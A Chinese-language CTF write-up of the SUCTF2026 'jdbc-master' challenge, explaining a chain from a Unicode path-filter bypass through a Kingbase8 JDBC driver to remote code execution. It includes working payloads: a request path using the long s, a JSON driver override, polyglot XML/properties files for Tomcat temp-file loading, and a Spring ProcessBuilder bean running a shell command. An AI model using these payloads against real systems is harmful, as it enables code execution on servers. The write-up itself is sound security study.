# SUCTF2026-jdbc-master

## 题目简述

题目提供一个 Spring Boot 的 JDBC 连通性测试接口，同时打包了 PostgreSQL 42.3.6 与 Kingbase8 8.6 驱动。利用链不是直接套 PostgreSQL 旧版 PoC，而是依次突破四层限制：

```text
Unicode 路由差异绕过拦截器
  -> JSON 覆盖默认 driver
  -> Kingbase8 ConfigurePath 二次加载隐藏参数
  -> Tomcat multipart 临时文件提供本地载体
  -> 未校验类型的 socketFactory 实例化 Spring XML
  -> 不出网执行并回显 flag
```

官方单题 WP 的主线把第一份临时文件构造成 XML/Properties 双用途文件，再由第二份 XML 加载内存马；总 WP 给出了一条更容易核验的替代路线：分别保留 properties 与 XML 文件，用 `ProcessBuilder` 把 `/flag` 写入 Tomcat docBase 后直接 HTTP 读取。下面以官方链条为主，同时保留后者作为无需内存马的回显方案。

## 解题过程

### 1. 利用 `ſ` 在过滤与路由之间制造语义差异

接口实际映射为：

```java
@RequestMapping("/api/connection")
@PostMapping("/suctf")
public Map<String, Object> testConnection(@RequestBody String json) {
    // ...
}
```

`PathInterceptor` 会对 `servletPath` 做三次检查：

```java
servletPath.matches("(?i).*s\\W*u\\W*c\\W*t\\W*f.*")
servletPath.toLowerCase().contains("suctf")
servletPath.toLowerCase()
           .replaceAll("[^a-z0-9]", "")
           .contains("suctf")
```

但 Web 配置又把 Spring 路由匹配设为大小写不敏感。Unicode 长 s `ſ` 在这里产生了关键差异：

- Java `equalsIgnoreCase` 会把 `ſ` 与 `s` 视为可匹配字符，因为 `ſ` 的大写形式为 `S`；
- `(?i)` 未启用 `UNICODE_CASE` 时主要按 ASCII 大小写处理，不会把 `ſ` 当成 `s`；
- `ſ`.toLowerCase() 仍是 `ſ`，第二项找不到字面 `suctf`；
- 第三项的 ASCII 白名单会删除 `ſ`，得到 `uctf`，仍不命中。

因此下面的路径能进入 `/suctf` 控制器，却不会被拦截器阻止：

```text
POST /api/connection/%C5%BFuctf
```

总 WP 的脚本在末尾加了矩阵参数 `;foo=1`，但官方利用并不依赖它；核心仍是 `%C5%BF` 解码后的 `ſ`。

### 2. 覆盖默认 JDBC 驱动

`Pg` DTO 构造时把驱动设为：

```java
this.driver = "org.postgresql.Driver";
```

这只是默认值，并非不可修改的常量。控制器使用 Jackson 将用户 JSON 反序列化成 `Pg`：对象先构造，再调用 setter 写入 JSON 中出现的字段，所以攻击者可以用 `driver` 字段覆盖默认值。

`ConnectionTestService` 随后直接加载并实例化该类：

```java
DatasourceConfiguration conf = objectMapper.readValue(json, Pg.class);
Class<?> clazz = driverClassLoader.loadClass(conf.getDriver());
Driver driver = (Driver) clazz.newInstance();
driver.connect(conf.getJdbc(), props);
```

于是可将驱动切换为附件中已经存在的 Kingbase8：

```json
{
  "urlType": "jdbcUrl",
  "driver": "com.kingbase8.Driver",
  "jdbcUrl": "jdbc:kingbase8:?ConfigurePath=...",
  "username": "a",
  "password": "b"
}
```

PostgreSQL 42.3.6 已不受 CVE-2022-21724 原始链影响；题目放入 Kingbase8 的意义，是其 `SocketFactoryFactory` 仍保留“先实例化、后强制转换”的旧逻辑。

### 3. 用 `ConfigurePath` 绕过首层 URL 黑名单

应用层 `validateJdbcUrl` 会拒绝：

- URL 中的 `:/` 和 `/?`；
- `socketFactory`、`socketFactoryArg`、`sslfactory`、`loggerFile`、`loggerLevel` 等危险参数名。

Kingbase8 允许省略主机、端口和数据库路径，使用只有 query 的 URL：

```text
jdbc:kingbase8:?ConfigurePath=/proc/self/fd/N
```

这个字符串没有 `:/` 或 `/?`，首层也没有出现被禁参数。驱动的 `connect` 解析 URL 后会检查 `ConfigurePath`：

```java
if (KBProperty.CONFIGUREPATH.get(props) != null) {
    props = initJDBCCONF(props);
}
```

`initJDBCCONF` 最终对指定本地文件执行 `Properties.load(new FileInputStream(file))`，把其中的键值重新合并进驱动属性。应用黑名单只审查了外层 JDBC URL，并不会再检查配置文件内容，所以第二阶段文件可以重新引入：

```properties
socketFactory=org.springframework.context.support.FileSystemXmlApplicationContext
socketFactoryArg=file:/path/to/payload.xml
```

这也是为什么不能把 `ConfigurePath` 简化成“任意文件读取”：真正需要的是它作为未经过滤的二阶段属性入口。

### 4. 从 Kingbase8 的类型检查顺序到 Spring XML 执行

Kingbase8 根据 `socketFactory` 反射实例化类时，优先寻找 `(Properties)` 构造器，失败后尝试 `(String)`，最后才尝试无参构造器；对象创建完成后才强制转换成 `SocketFactory`。概括如下：

```java
Class<?> cls = Class.forName(className);
try {
    ctor = cls.getConstructor(Properties.class);
} catch (NoSuchMethodException e) {
    ctor = cls.getConstructor(String.class);
    ctorArgs = new String[]{arg};
}
Object object = ctor.newInstance(ctorArgs);
return (SocketFactory) object;
```

`FileSystemXmlApplicationContext` 有接收字符串路径的构造器。指定它后，会先执行：

```java
new FileSystemXmlApplicationContext("file:/path/to/payload.xml")
```

Spring 已经完成 XML 解析和 bean 初始化，外层才因对象不能转换为 `SocketFactory` 报错；该异常不会撤销 XML 产生的副作用。

[pgjdbc 的修复提交](https://github.com/pgjdbc/pgjdbc/commit/f4d0ed69c0b3aae8531d83d6af4c57f22312c813)展示了相反的安全顺序：先要求加载的类是 `SocketFactory` 的子类，再进行实例化。Kingbase8 此处缺少这项预验证，才保留了与 CVE-2022-21724 同类的利用原语。

### 5. 用未完成 multipart 请求制造本地临时文件

题目通过 Java SecurityManager 禁止向外主动连接，所以不能让 `socketFactoryArg` 指向攻击者 HTTP 服务器。可利用 Tomcat 处理 multipart 时的磁盘缓存：

1. 建立原始 TCP 连接并发送 `multipart/form-data` 请求头；
2. 声明很大的 `Content-Length`，发送足以超过内存阈值的文件内容；
3. 故意不发送完整请求并保持连接，使临时文件和对应 fd 持续存在。

文件通常落在：

```text
/tmp/tomcat.8080.<随机值>/work/Tomcat/localhost/ROOT/
  upload_<uuid>_00000000.tmp
  upload_<uuid>_00000001.tmp
```

同时，Java 进程的 `/proc/self/fd/N` 会指向这些文件。fd 编号受运行状态影响，官方脚本在一个小范围内并发尝试；范围只是经验参数，不是漏洞固定值。

需要两类内容载体：

- Kingbase8 先把一份文件按 Java Properties 读取；
- `FileSystemXmlApplicationContext` 再把 XML 按 Spring bean 配置读取。

如果两份文件都是普通单一格式，又让 Spring 通过宽泛通配符加载目录中的全部 `.tmp`，properties 文件会因不是合法 XML 而使解析失败。官方解法用一个多语文件解决了这个冲突。

### 6. 官方主线：XML/Properties 双用途文件

第一份临时文件本身是合法 Spring XML，同时在 XML 属性值的独立行中嵌入两条合法 Properties：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
       http://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean id="poc" class="java.lang.String">
    <constructor-arg value="
socketFactory=org.springframework.context.support.FileSystemXmlApplicationContext
socketFactoryArg=file:/${catalina.home}/**/*.tmp
    "/>
  </bean>
</beans>
```

`Properties.load` 会提取两条 `key=value`；Spring 把同一文件当 XML 时，它又只是创建一个无害的字符串 bean。这样 `**/*.tmp` 即使同时匹配第一份文件，也不会因 XML 格式错误而中断。

第二份临时文件才是实际执行载荷。官方附件 `exp.xml` 的结构是：

1. Base64 解码内存马 class 字节；
2. 通过 `javax.management.loading.MLet#defineClass` 定义类；
3. 实例化该类，把监听逻辑注入当前 Tomcat/Spring 进程。

完整 Base64 class 很长，且依赖具体中间件版本，不应把它当作通用常量；复现时直接使用官方 `exp/exp.xml`，或按目标版本重新生成。关键是载荷完全来自本地临时文件，不需要目标出网。

官方脚本的时序为：

```text
保持连接 A -> 缓存双用途 evil.txt
保持连接 B -> 缓存真正的 exp.xml
循环请求    -> ConfigurePath=/proc/self/fd/N
命中 fd     -> 读出隐藏属性
Spring 通配 -> 同时解析两个合法 XML
实例化载荷  -> 内存马生效
```

### 7. 替代路线：分离两份文件并直接写 docBase

总 WP 没有使用内存马，而是令第二份 XML 创建并启动 `ProcessBuilder`：

```xml
<bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
  <constructor-arg>
    <list>
      <value>sh</value>
      <value>-c</value>
      <value>for d in /tmp/tomcat-docbase.8080.*;
             do cat /flag &gt; "$d/flag.txt"; done</value>
    </list>
  </constructor-arg>
</bean>
```

第一份纯 properties 文件则指定一个只命中 XML 临时文件的模式：

```properties
loggerLevel=DEBUG
loggerFile=/proc/self/fd/1
socketFactory=org.springframework.context.support.FileSystemXmlApplicationContext
socketFactoryArg=file:/tmp/tomcat.*/work/Tomcat/localhost/ROOT/*00000000.tmp
```

由于这份 properties 自身不是合法 XML，通配符不能写成 `*.tmp`，否则 Spring 会把它也当 XML 解析。脚本先挂起 XML 上传，再挂起 properties 上传，以期 XML 获得 `00000000.tmp`；这个编号依赖干净环境和创建顺序，应在本地验证，必要时收窄到实际后缀。

命中 properties 对应 fd 后，XML 会把 `/flag` 写到 Tomcat docBase。随后直接请求：

```text
GET /flag.txt
```

即可回显 flag。这条路线省掉内存马和二次交互，更适合作为最小验证链；官方多语文件路线则避免了依赖临时文件序号的窄匹配。

官方仓库给出的静态 flag 为：

```text
suctf{u5Ing_JdbC_70_rce_iS_vEry_s1mpl3!_!!}
```

平台动态环境应以实际读取结果为准。

## 方法总结

本题的核心是多层解析边界不一致：拦截器和 Spring 路由对 Unicode 大小写的理解不同，DTO 默认值可以被 Jackson 字段覆盖，应用只检查第一层 JDBC URL，而 Kingbase8 又从 `ConfigurePath` 加载第二层属性，最后驱动在验证接口类型之前就执行了攻击者指定类的构造器。

不出网条件下，Tomcat 临时文件同时解决了“如何把 properties 放到本地”和“如何把 Spring XML 放到本地”两个问题。官方多语文件让宽通配符下的所有载体都保持 XML 合法；替代路线则用精确文件名把两种格式隔离。复现时最值得逐项观测的是路由是否真正进入控制器、临时文件路径与 fd、`ConfigurePath` 是否读取成功，以及 Spring 通配符最终匹配了哪些文件。
